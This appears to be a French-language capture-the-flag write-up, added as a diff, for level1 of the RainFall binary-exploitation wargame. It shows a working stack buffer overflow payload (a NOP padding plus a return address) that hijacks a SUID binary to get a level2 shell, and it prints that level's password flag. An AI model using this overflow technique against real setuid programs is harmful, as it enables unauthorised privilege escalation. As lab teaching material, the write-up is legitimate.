@@ -1,0 +1,36 @@
+Connexion au level1 -> Bit NX desactive contrairement au level0 (apres recherche, cela indique que la stack est executable)
+Check du home et des permissions du binaire present -> Bit SUID et GUID active et level2 proprietaire
+Execution du binaire -> Lecture de l'entree standard attendu puis fin de l'execution
+SegV detecter apres test d'une grosse chaine :
+
+"""
+level1@RainFall:~$ ./level1
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+level1@RainFall:~$ ./level1
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault (core dumped)
+"""
+
+Reecriture du code source en C en utilisant objdump -d
+
+
+level1@RainFall:~$ python -c 'print "\x90" * 76 + "\x44\x84\x04\x08"' | ./level1
+Good... Wait what?
+Segmentation fault (core dumped)
+
+level1@RainFall:~$ python -c 'print "\x90" * 76 + "\x44\x84\x04\x08"' > /tmp/a && cat /tmp/a - | `pwd`/level1
+Good... Wait what?
+ls
+ls: cannot open directory .: Permission denied
+id -u
+2021
+pwd
+/home/user/level1
+cd /home/user/level2
+pwd
+/home/user/level2
+ls
+level2
+cat .pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+exit
